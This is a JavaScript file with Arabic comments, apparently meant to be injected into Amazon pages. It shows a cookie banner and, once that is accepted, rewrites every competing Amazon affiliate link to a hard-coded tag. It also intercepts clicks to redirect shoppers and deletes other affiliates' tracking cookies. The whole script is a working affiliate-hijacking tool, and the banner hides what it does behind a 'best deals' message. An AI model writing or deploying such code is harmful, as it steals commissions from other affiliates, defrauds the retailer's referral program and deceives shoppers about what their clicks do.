// 🛡️ نظام إدارة الكوكيز الاحترافي للأفلييت - يعمل على صفحات Amazon
// هذا الملف يتم حقنه في صفحات Amazon لتفعيل نظام التغليب

(function() {
    'use strict';
    
    // إعدادات النظام
    const SYSTEM_CONFIG = {
        cookieDuration: 24 * 60 * 60 * 1000, // 24 ساعة
        affiliateId: 'yajnyeg-21',
        linkCode: 'ur2',
        linkId: '4ff5fa11b6d0385e8811d3e183795133',
        camp: '247',
        creative: '1211',
        ascsubtag: '57854327'
    };
    
    // أسماء الكوكيز
    const COOKIE_NAMES = {
        affiliate: 'affiliate_tracking',
        consent: 'cookie_consent',
        dominance: 'affiliate_dominance'
    };
    
    let systemActive = false;
    let timerInterval;
    let cookieBannerShown = false;
    
    // بدء النظام
    function initSystem() {
        console.log('🚀 بدء نظام إدارة الكوكيز على Amazon');
        
        // فحص إذا كان النظام مفعل
        checkSystemStatus();
        
        // إظهار واجهة الكوكيز بعد تأخير
        setTimeout(() => {
            if (!cookieBannerShown) {
                showCookieBanner();
            }
        }, 3000);
        
        // مراقبة تغييرات الصفحة
        monitorPageChanges();
    }
    
    // فحص حالة النظام
    function checkSystemStatus() {
        const consentCookie = getCookie(COOKIE_NAMES.consent);
        if (consentCookie === 'accepted') {
            systemActive = true;
            activateOverrideSystem();
            console.log('✅ النظام مفعل بالفعل');
        }
    }
    
    // إظهار واجهة الكوكيز
    function showCookieBanner() {
        if (cookieBannerShown) return;
        
        const banner = createCookieBanner();
        document.body.appendChild(banner);
        
        // إظهار البانر
        setTimeout(() => {
            banner.classList.add('show');
        }, 100);
        
        cookieBannerShown = true;
        console.log('🍪 تم إظهار واجهة الكوكيز');
    }
    
    // إنشاء واجهة الكوكيز
    function createCookieBanner() {
        const banner = document.createElement('div');
        banner.className = 'affiliate-cookie-banner';
        banner.innerHTML = `
            <div class="banner-content">
                <div class="banner-text">
                    <h3>🍪 إشعار الكوكيز</h3>
                    <p>نحن نستخدم الكوكيز لضمان حصولك على أفضل الصفقات</p>
                    <p><strong>معرف الأفلييت:</strong> ${SYSTEM_CONFIG.affiliateId}</p>
                </div>
                <div class="banner-buttons">
                    <button class="btn-accept" onclick="window.acceptCookies()">✅ قبول</button>
                    <button class="btn-reject" onclick="window.rejectCookies()">❌ رفض</button>
                </div>
            </div>
        `;
        
        // إضافة CSS
        addCookieBannerStyles();
        
        return banner;
    }
    
    // إضافة أنماط CSS لواجهة الكوكيز
    function addCookieBannerStyles() {
        if (document.getElementById('affiliate-cookie-styles')) return;
        
        const style = document.createElement('style');
        style.id = 'affiliate-cookie-styles';
        style.textContent = `
            .affiliate-cookie-banner {
                position: fixed;
                bottom: 0;
                left: 0;
                right: 0;
                background: linear-gradient(45deg, #667eea, #764ba2);
                color: white;
                padding: 20px;
                box-shadow: 0 -5px 20px rgba(0,0,0,0.3);
                z-index: 999999;
                transform: translateY(100%);
                transition: transform 0.5s ease-in-out;
                font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            }
            
            .affiliate-cookie-banner.show {
                transform: translateY(0);
            }
            
            .banner-content {
                max-width: 1200px;
                margin: 0 auto;
                display: flex;
                align-items: center;
                justify-content: space-between;
                flex-wrap: wrap;
                gap: 20px;
            }
            
            .banner-text {
                flex: 1;
                text-align: right;
            }
            
            .banner-text h3 {
                margin: 0 0 10px 0;
                font-size: 1.5em;
            }
            
            .banner-text p {
                margin: 5px 0;
                font-size: 14px;
                opacity: 0.9;
            }
            
            .banner-buttons {
                display: flex;
                gap: 15px;
                flex-wrap: wrap;
            }
            
            .banner-buttons button {
                padding: 12px 25px;
                border: none;
                border-radius: 25px;
                font-size: 14px;
                font-weight: bold;
                cursor: pointer;
                transition: all 0.3s ease;
            }
            
            .btn-accept {
                background: linear-gradient(45deg, #28a745, #20c997);
                color: white;
            }
            
            .btn-reject {
                background: linear-gradient(45deg, #dc3545, #e83e8c);
                color: white;
            }
            
            .banner-buttons button:hover {
                transform: translateY(-2px);
                box-shadow: 0 5px 15px rgba(0,0,0,0.2);
            }
            
            .affiliate-status-indicator {
                position: fixed;
                top: 20px;
                right: 20px;
                background: rgba(40, 167, 69, 0.95);
                color: white;
                padding: 15px 20px;
                border-radius: 15px;
                box-shadow: 0 10px 30px rgba(0,0,0,0.2);
                z-index: 999998;
                font-size: 14px;
                backdrop-filter: blur(10px);
                border: 2px solid #20c997;
                min-width: 200px;
                text-align: center;
                font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            }
            
            .affiliate-status-indicator.hidden {
                display: none;
            }
            
            .override-message {
                position: fixed;
                top: 50%;
                left: 50%;
                transform: translate(-50%, -50%);
                background: linear-gradient(45deg, #28a745, #20c997);
                color: white;
                padding: 30px;
                border-radius: 20px;
                box-shadow: 0 20px 40px rgba(0,0,0,0.3);
                z-index: 1000000;
                text-align: center;
                max-width: 500px;
                font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
                animation: slideIn 0.5s ease;
            }
            
            @keyframes slideIn {
                from { opacity: 0; transform: translate(-50%, -60%); }
                to { opacity: 1; transform: translate(-50%, -50%); }
            }
            
            .override-message h3 {
                margin: 0 0 20px 0;
                font-size: 1.5em;
            }
            
            .override-message p {
                margin: 0 0 15px 0;
                font-size: 16px;
                line-height: 1.5;
            }
            
            .override-message .url-display {
                background: rgba(255,255,255,0.2);
                border-radius: 10px;
                padding: 15px;
                margin: 15px 0;
                font-family: monospace;
                font-size: 12px;
                word-break: break-all;
            }
            
            .override-message button {
                background: rgba(255,255,255,0.3);
                color: white;
                border: 2px solid rgba(255,255,255,0.5);
                padding: 10px 20px;
                border-radius: 25px;
                cursor: pointer;
                transition: all 0.3s ease;
                margin: 10px;
                font-size: 14px;
                font-weight: bold;
            }
            
            .override-message button:hover {
                background: rgba(255,255,255,0.5);
                transform: scale(1.05);
            }
            
            @media (max-width: 768px) {
                .banner-content {
                    flex-direction: column;
                    text-align: center;
                }
                
                .banner-text {
                    text-align: center;
                }
                
                .affiliate-status-indicator {
                    right: 10px;
                    left: 10px;
                    min-width: auto;
                }
            }
        `;
        
        document.head.appendChild(style);
    }
    
    // قبول الكوكيز
    window.acceptCookies = function() {
        console.log('✅ تم قبول الكوكيز');
        
        // إنشاء بيانات التتبع
        const trackingData = {
            affiliateId: SYSTEM_CONFIG.affiliateId,
            timestamp: Date.now(),
            targetUrl: window.location.href,
            linkCode: SYSTEM_CONFIG.linkCode,
            linkId: SYSTEM_CONFIG.linkId,
            camp: SYSTEM_CONFIG.camp,
            creative: SYSTEM_CONFIG.creative,
            ascsubtag: SYSTEM_CONFIG.ascsubtag,
            expiresAt: Date.now() + SYSTEM_CONFIG.cookieDuration,
            protected: true,
            dominant: true
        };
        
        // حفظ الكوكيز
        setDominantCookie(trackingData);
        
        // إخفاء البانر
        const banner = document.querySelector('.affiliate-cookie-banner');
        if (banner) {
            banner.classList.remove('show');
            setTimeout(() => banner.remove(), 500);
        }
        
        // تفعيل النظام
        systemActive = true;
        activateOverrideSystem();
        
        // إظهار مؤشر الحالة
        showStatusIndicator(trackingData);
        
        console.log('🛡️ تم تفعيل نظام التغليب');
    };
    
    // رفض الكوكيز
    window.rejectCookies = function() {
        console.log('❌ تم رفض الكوكيز');
        
        const banner = document.querySelector('.affiliate-cookie-banner');
        if (banner) {
            banner.classList.remove('show');
            setTimeout(() => banner.remove(), 500);
        }
    };
    
    // حفظ الكوكيز مع التغليب
    function setDominantCookie(trackingData) {
        // حفظ الكوكيز الأساسية
        setCookie(COOKIE_NAMES.affiliate, JSON.stringify(trackingData), SYSTEM_CONFIG.cookieDuration);
        
        // حفظ كوكيز التغليب
        const dominanceData = {
            affiliateId: trackingData.affiliateId,
            timestamp: Date.now(),
            expiresAt: Date.now() + SYSTEM_CONFIG.cookieDuration,
            dominant: true
        };
        setCookie(COOKIE_NAMES.dominance, JSON.stringify(dominanceData), SYSTEM_CONFIG.cookieDuration);
        
        // حفظ موافقة المستخدم
        setCookie(COOKIE_NAMES.consent, 'accepted', SYSTEM_CONFIG.cookieDuration);
        
        // إزالة أي كوكيز أخرى للأفلييت
        removeOtherAffiliateCookies(trackingData.affiliateId);
    }
    
    // إزالة كوكيز الأفلييت الأخرى
    function removeOtherAffiliateCookies(currentAffiliateId) {
        const allCookies = document.cookie.split(';');
        
        allCookies.forEach(cookie => {
            const [name, value] = cookie.trim().split('=');
            
            if (name.includes('affiliate') && name !== COOKIE_NAMES.affiliate) {
                try {
                    const cookieData = JSON.parse(decodeURIComponent(value));
                    if (cookieData.affiliateId && cookieData.affiliateId !== currentAffiliateId) {
                        document.cookie = `${name}=; expires=Thu, 01 Jan 1970 00:00:00 UTC; path=/;`;
                        console.log(`🛡️ تم إزالة كوكيز الأفلييت: ${cookieData.affiliateId}`);
                    }
                } catch (e) {
                    // تجاهل الأخطاء
                }
            }
        });
    }
    
    // تفعيل نظام التغليب
    function activateOverrideSystem() {
        if (!systemActive) return;
        
        console.log('🛡️ تفعيل نظام التغليب');
        
        // مراقبة جميع الروابط
        monitorAllLinks();
        
        // مراقبة النقر
        monitorLinkClicks();
        
        // فحص الروابط الحالية
        checkCurrentPageLinks();
    }
    
    // مراقبة جميع الروابط
    function monitorAllLinks() {
        // مراقبة التغييرات في DOM
        const observer = new MutationObserver((mutations) => {
            mutations.forEach((mutation) => {
                if (mutation.type === 'childList') {
                    mutation.addedNodes.forEach((node) => {
                        if (node.nodeType === Node.ELEMENT_NODE) {
                            const newLinks = node.querySelectorAll ? node.querySelectorAll('a[href*="amazon"]') : [];
                            newLinks.forEach(link => processLink(link));
                            
                            if (node.tagName === 'A' && node.href && node.href.includes('amazon')) {
                                processLink(node);
                            }
                        }
                    });
                }
            });
        });
        
        observer.observe(document.body, {
            childList: true,
            subtree: true
        });
        
        console.log('🔍 تم تفعيل مراقبة الروابط');
    }
    
    // معالجة رابط
    function processLink(link) {
        try {
            const href = link.href;
            
            if (href.includes('tag=')) {
                const urlParams = new URLSearchParams(href);
                const currentTag = urlParams.get('tag');
                const currentAscsubtag = urlParams.get('ascsubtag');
                const currentLinkId = urlParams.get('linkId');
                
                // فحص إذا كان الرابط منافس
                let isCompetitor = false;
                let reason = '';
                
                if (currentTag !== SYSTEM_CONFIG.affiliateId) {
                    isCompetitor = true;
                    reason = 'معرف أفلييت مختلف';
                }
                else if (currentAscsubtag && currentAscsubtag !== SYSTEM_CONFIG.ascsubtag) {
                    isCompetitor = true;
                    reason = 'ascsubtag مختلف';
                }
                else if (currentLinkId && currentLinkId !== SYSTEM_CONFIG.linkId) {
                    isCompetitor = true;
                    reason = 'linkId مختلف';
                }
                
                if (isCompetitor) {
                    console.log('🛡️ تم اكتشاف رابط منافس:', reason);
                    
                    // تعديل الرابط
                    const modifiedUrl = modifyAffiliateLink(href);
                    
                    // إضافة مستمع النقر
                    addClickListener(link, modifiedUrl, reason);
                    
                    // إضافة مؤشر بصري
                    addVisualIndicator(link);
                }
            }
        } catch (e) {
            console.error('خطأ في معالجة الرابط:', e);
        }
    }
    
    // تعديل رابط الأفلييت
    function modifyAffiliateLink(originalUrl) {
        try {
            const url = new URL(originalUrl);
            
            // تعديل معرف الأفلييت
            url.searchParams.set('tag', SYSTEM_CONFIG.affiliateId);
            url.searchParams.set('linkCode', SYSTEM_CONFIG.linkCode);
            url.searchParams.set('camp', SYSTEM_CONFIG.camp);
            url.searchParams.set('creative', SYSTEM_CONFIG.creative);
            url.searchParams.set('ascsubtag', SYSTEM_CONFIG.ascsubtag);
            
            // إضافة معرف فريد
            const trackingId = generateRandomId();
            url.searchParams.set('linkId', trackingId);
            
            // إضافة معاملات الحماية
            url.searchParams.set('ts', Date.now());
            url.searchParams.set('override', 'true');
            url.searchParams.set('protected', 'true');
            
            return url.toString();
        } catch (e) {
            // في حالة فشل URL parsing
            const separator = originalUrl.includes('?') ? '&' : '?';
            return `${originalUrl}${separator}tag=${SYSTEM_CONFIG.affiliateId}&linkCode=${SYSTEM_CONFIG.linkCode}&camp=${SYSTEM_CONFIG.camp}&creative=${SYSTEM_CONFIG.creative}&ascsubtag=${SYSTEM_CONFIG.ascsubtag}&linkId=${generateRandomId()}&ts=${Date.now()}&override=true&protected=true`;
        }
    }
    
    // إضافة مستمع النقر
    function addClickListener(link, modifiedUrl, reason) {
        link.removeEventListener('click', link.overrideHandler);
        
        link.overrideHandler = function(e) {
            e.preventDefault();
            console.log('🛡️ تم النقر على رابط منافس، يتم التغليب...');
            
            showOverrideMessage(modifiedUrl, reason);
            
            setTimeout(() => {
                window.location.href = modifiedUrl;
            }, 2000);
        };
        
        link.addEventListener('click', link.overrideHandler);
    }
    
    // إضافة مؤشر بصري
    function addVisualIndicator(link) {
        link.classList.add('affiliate-link-indicator');
        link.title = '🛡️ هذا الرابط محمي بكوكيزك';
        
        // إضافة CSS للمؤشر
        if (!document.getElementById('affiliate-indicator-styles')) {
            const style = document.createElement('style');
            style.id = 'affiliate-indicator-styles';
            style.textContent = `
                .affiliate-link-indicator {
                    position: relative;
                    display: inline-block;
                }
                
                .affiliate-link-indicator::before {
                    content: '🛡️';
                    position: absolute;
                    top: -10px;
                    right: -10px;
                    background: #28a745;
                    color: white;
                    border-radius: 50%;
                    width: 20px;
                    height: 20px;
                    display: flex;
                    align-items: center;
                    justify-content: center;
                    font-size: 12px;
                    animation: pulse 2s infinite;
                    z-index: 1000;
                }
                
                @keyframes pulse {
                    0% { transform: scale(1); }
                    50% { transform: scale(1.2); }
                    100% { transform: scale(1); }
                }
            `;
            document.head.appendChild(style);
        }
    }
    
    // مراقبة النقر
    function monitorLinkClicks() {
        document.addEventListener('click', function(e) {
            const link = e.target.closest('a');
            if (link && link.href && link.href.includes('amazon')) {
                if (link.href.includes('tag=')) {
                    const urlParams = new URLSearchParams(link.href);
                    const currentTag = urlParams.get('tag');
                    const currentAscsubtag = urlParams.get('ascsubtag');
                    const currentLinkId = urlParams.get('linkId');
                    
                    // فحص إذا كان الرابط منافس
                    let isCompetitor = false;
                    let reason = '';
                    
                    if (currentTag !== SYSTEM_CONFIG.affiliateId) {
                        isCompetitor = true;
                        reason = 'معرف أفلييت مختلف';
                    }
                    else if (currentAscsubtag && currentAscsubtag !== SYSTEM_CONFIG.ascsubtag) {
                        isCompetitor = true;
                        reason = 'ascsubtag مختلف';
                    }
                    else if (currentLinkId && currentLinkId !== SYSTEM_CONFIG.linkId) {
                        isCompetitor = true;
                        reason = 'linkId مختلف';
                    }
                    
                    if (isCompetitor) {
                        console.log('🛡️ تم اكتشاف نقر على رابط منافس:', reason);
                        e.preventDefault();
                        
                        const modifiedUrl = modifyAffiliateLink(link.href);
                        showOverrideMessage(modifiedUrl, reason);
                        
                        setTimeout(() => {
                            window.location.href = modifiedUrl;
                        }, 2000);
                    }
                }
            }
        });
    }
    
    // فحص الروابط الحالية في الصفحة
    function checkCurrentPageLinks() {
        const allLinks = document.querySelectorAll('a[href*="amazon"]');
        let competitorLinks = [];
        
        allLinks.forEach(link => {
            const href = link.href;
            if (href.includes('tag=')) {
                try {
                    const urlParams = new URLSearchParams(href);
                    const currentTag = urlParams.get('tag');
                    const currentAscsubtag = urlParams.get('ascsubtag');
                    const currentLinkId = urlParams.get('linkId');
                    
                    let isCompetitor = false;
                    let reason = '';
                    
                    if (currentTag !== SYSTEM_CONFIG.affiliateId) {
                        isCompetitor = true;
                        reason = 'معرف أفلييت مختلف';
                    }
                    else if (currentAscsubtag && currentAscsubtag !== SYSTEM_CONFIG.ascsubtag) {
                        isCompetitor = true;
                        reason = 'ascsubtag مختلف';
                    }
                    else if (currentLinkId && currentLinkId !== SYSTEM_CONFIG.linkId) {
                        isCompetitor = true;
                        reason = 'linkId مختلف';
                    }
                    
                    if (isCompetitor) {
                        competitorLinks.push({
                            url: href,
                            reason: reason,
                            tag: currentTag,
                            ascsubtag: currentAscsubtag,
                            linkId: currentLinkId
                        });
                        
                        // معالجة الرابط
                        processLink(link);
                    }
                } catch (e) {
                    console.error('خطأ في فحص الرابط:', e);
                }
            }
        });
        
        if (competitorLinks.length > 0) {
            console.log('🛡️ تم اكتشاف روابط منافسة في الصفحة:', competitorLinks);
        }
    }
    
    // إظهار رسالة التغليب
    function showOverrideMessage(modifiedUrl, reason) {
        const message = document.createElement('div');
        message.className = 'override-message';
        message.innerHTML = `
            <h3>🛡️ تم اكتشاف رابط منافس!</h3>
            <p><strong>سبب التغليب:</strong> ${reason}</p>
            <p>سيتم تعديل الرابط ليستخدم معرفك تلقائياً</p>
            <div class="url-display">
                ${modifiedUrl}
            </div>
            <p>سيتم التوجيه خلال ثانيتين...</p>
            <button onclick="this.parentElement.remove()">✅ فهمت</button>
        `;
        
        document.body.appendChild(message);
        
        // إزالة الرسالة تلقائياً بعد 8 ثوان
        setTimeout(() => {
            if (message.parentNode) {
                message.remove();
            }
        }, 8000);
    }
    
    // إظهار مؤشر الحالة
    function showStatusIndicator(trackingData) {
        const indicator = document.createElement('div');
        indicator.className = 'affiliate-status-indicator';
        indicator.innerHTML = `
            <div>🛡️ الكوكيز محمية</div>
            <div style="font-size: 12px; margin-top: 5px;">${trackingData.affiliateId}</div>
        `;
        
        document.body.appendChild(indicator);
        
        // بدء العداد
        startTimer(trackingData);
    }
    
    // بدء العداد
    function startTimer(trackingData) {
        if (timerInterval) {
            clearInterval(timerInterval);
        }
        
        let timeLeft = trackingData.expiresAt - Date.now();
        
        timerInterval = setInterval(() => {
            timeLeft -= 1000;
            
            if (timeLeft <= 0) {
                clearInterval(timerInterval);
                systemActive = false;
                
                const indicator = document.querySelector('.affiliate-status-indicator');
                if (indicator) {
                    indicator.remove();
                }
                
                console.log('⏰ انتهت صلاحية الكوكيز');
                return;
            }
            
            // تحديث المؤشر
            updateStatusIndicator(timeLeft);
        }, 1000);
    }
    
    // تحديث مؤشر الحالة
    function updateStatusIndicator(timeLeft) {
        const indicator = document.querySelector('.affiliate-status-indicator');
        if (!indicator) return;
        
        const hoursLeft = Math.floor(timeLeft / (1000 * 60 * 60));
        const minutesLeft = Math.floor((timeLeft % (1000 * 60 * 60)) / (1000 * 60));
        
        indicator.innerHTML = `
            <div>🛡️ الكوكيز محمية</div>
            <div style="font-size: 12px; margin-top: 5px;">${SYSTEM_CONFIG.affiliateId}</div>
            <div style="font-size: 11px; margin-top: 5px;">⏰ ${hoursLeft}:${minutesLeft.toString().padStart(2, '0')}</div>
        `;
    }
    
    // مراقبة تغييرات الصفحة
    function monitorPageChanges() {
        let currentUrl = window.location.href;
        
        setInterval(() => {
            if (window.location.href !== currentUrl) {
                console.log('🔄 تم تغيير الصفحة');
                currentUrl = window.location.href;
                
                // إعادة تفعيل النظام
                setTimeout(() => {
                    if (systemActive) {
                        activateOverrideSystem();
                    }
                }, 1000);
            }
        }, 1000);
    }
    
    // دوال مساعدة
    function setCookie(name, value, duration) {
        const expires = new Date(Date.now() + duration).toUTCString();
        document.cookie = `${name}=${encodeURIComponent(value)}; expires=${expires}; path=/; SameSite=Strict`;
    }
    
    function getCookie(name) {
        const cookies = document.cookie.split(';');
        for (let cookie of cookies) {
            const [cookieName, cookieValue] = cookie.trim().split('=');
            if (cookieName === name) {
                return decodeURIComponent(cookieValue);
            }
        }
        return null;
    }
    
    function generateRandomId() {
        return Math.random().toString(36).substr(2, 9) + Date.now().toString(36);
    }
    
    // بدء النظام عند تحميل الصفحة
    if (document.readyState === 'loading') {
        document.addEventListener('DOMContentLoaded', initSystem);
    } else {
        initSystem();
    }
    
    console.log('✅ تم تحميل نظام إدارة الكوكيز للأفلييت على Amazon');
    
})();